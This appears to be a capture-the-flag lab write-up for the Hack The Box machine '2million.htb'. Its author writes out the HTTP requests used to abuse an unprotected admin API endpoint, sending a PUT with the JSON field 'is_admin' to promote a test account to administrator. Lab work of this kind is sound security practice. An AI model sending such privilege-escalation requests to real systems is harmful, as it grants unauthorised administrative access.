Focusing on attempting to exploit this `api` to make me an `admin`

![[Pasted image 20250418194741.png]]
Original Request
```http
GET /api/v1 HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=jmfes0rti5g4lmau3vesfhp6fk
Connection: keep-alive
```
modified to test with
```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=jmfes0rti5g4lmau3vesfhp6fk
Connection: keep-alive
```
now sending this through `repeater` shows that  `content type` is wrong
![[Pasted image 20250418195051.png]]
if we `steal` the `content type` it works and we get another message
![[Pasted image 20250418195144.png]]
now i need to add an email, but need to figure out how

```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=jmfes0rti5g4lmau3vesfhp6fk
Connection: keep-alive
Content-Type: application/json
```
this is what `chatgpt` came up with for formatiing
```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=jmfes0rti5g4lmau3vesfhp6fk
Connection: keep-alive
Content-Type: application/json
Content-Length: 50

{
  "email": "test@test.local"
}
```
after adding an `email` it shows that we are missing an addition parameter `is_admin`
![[Pasted image 20250418195435.png]]
trying to add `is_admin` and it needs commas to work
```bash
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=jmfes0rti5g4lmau3vesfhp6fk
Connection: keep-alive
Content-Type: application/json
Content-Length: 52

{
  "email": "test@test.local",
  "is_admin":true
}
```
need to change `true` to  `1`
![[Pasted image 20250418195740.png]]
now i believe the `test` user is an `admin` but need to test it
![[Pasted image 20250418195807.png]]
now i need tocheck if we're actually admin with this `api`
![[Pasted image 20250418195959.png]]
and we are
![[Pasted image 20250418200027.png]]